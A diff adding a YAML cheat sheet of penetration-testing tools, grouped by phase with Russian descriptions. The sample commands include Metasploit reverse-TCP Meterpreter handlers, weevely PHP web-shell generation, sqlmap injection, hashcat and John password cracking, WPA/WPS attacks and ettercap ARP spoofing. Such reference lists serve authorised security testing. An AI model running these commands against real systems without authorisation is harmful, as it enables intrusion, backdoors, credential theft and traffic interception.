@@ -1,0 +1,74 @@
+pentest_network:
+  information_gathering:
+    - name: nmap
+      use_case: "nmap -sV -T4 target_ip"
+      description: "Сканирование открытых портов и определение версий служб."
+    - name: masscan
+      use_case: "masscan -p1-65535 target_ip --rate=1000"
+      description: "Быстрое сканирование всех 65535 портов."
+    - name: theHarvester
+      use_case: "theHarvester -d example.com -b google"
+      description: "Сбор e-mail адресов и имен хостов через Google."
+  vulnerability_analysis:
+    - name: openvas
+      use_case: "gvm-cli socket --xml='<get_reports/>'"
+      description: "Получение отчетов о уязвимостях с помощью GVM CLI."
+    - name: nessus
+      use_case: "nessuscli scan new --policy='Basic Network Scan' --target 'target_ip'"
+      description: "Запуск сканирования на целевом IP."
+  vulnerability_exploitation:
+    - name: metasploit-framework
+      use_case: "msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST local_ip; run'"
+      description: "Запуск обратного TCP-шелла для Windows цели."
+    - name: sqlmap
+      use_case: "sqlmap -u 'http://example.com/page.php?id=1' --dbs"
+      description: "Определение и эксплуатация SQL инъекций."
+  post_exploitation:
+    - name: weevely
+      use_case: "weevely generate password123 /path/to/shell.php"
+      description: "Генерация обратного PHP шелла."
+    - name: meterpreter
+      use_case: "use exploit/multi/handler; set PAYLOAD php/meterpreter_reverse_tcp; set LHOST local_ip; set LPORT 4444; run"
+      description: "Установление обратной Meterpreter сессии для PHP цели."
+  password_attacks:
+    - name: john
+      use_case: "john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt"
+      description: "Взлом паролей из файла hash.txt с использованием списка rockyou."
+    - name: hashcat
+      use_case: "hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt"
+      description: "Взлом хешей MD5 с использованием списка rockyou."
+  wireless_attacks:
+    - name: aircrack-ng
+      use_case: "aircrack-ng -w /path/to/wordlist.txt -b target_BSSID /path/to/capture.cap"
+      description: "Взлом WPA/WPA2 пароля из захваченного трафика."
+    - name: reaver
+      use_case: "reaver -i wlan0mon -b target_BSSID -vv"
+      description: "WPS PIN атака."
+  sniffing_spoofing:
+    - name: wireshark
+      use_case: "wireshark -i wlan0 -k"
+      description: "Захват трафика на интерфейсе wlan0."
+    - name: ettercap
+      use_case: "ettercap -T -M arp:remote /target_ip// /gateway_ip//"
+      description: "ARP spoofing атака для перехвата трафика."
+  web_application_analysis:
+    - name: burpsuite
+      use_case: "burpsuite"
+      description: "Интерактивный анализ веб-приложений."
+    - name: zap
+      use_case: "zap"
+      description: "Автоматизированное сканирование веб-приложений на уязвимости."
+  automation_tools:
+    - name: nmap-scripts
+      use_case: "nmap --script=vuln target_ip"
+      description: "Использование скриптов Nmap для обнаружения уязвимостей."
+    - name: metasploit-modules
+      use_case: "msfconsole -x 'search type:exploit platform:windows'"
+      description: "Поиск эксплойтов для Windows в Metasploit."
+  reporting_tools:
+    - name: faraday
+      use_case: "faraday-manage start"
+      description: "Управление процессом пентеста и агрегация результатов."
+    - name: dradis
+      use_case: "dradis"
+      description: "Сбор и управление информацией о безопасности во время тестирования."
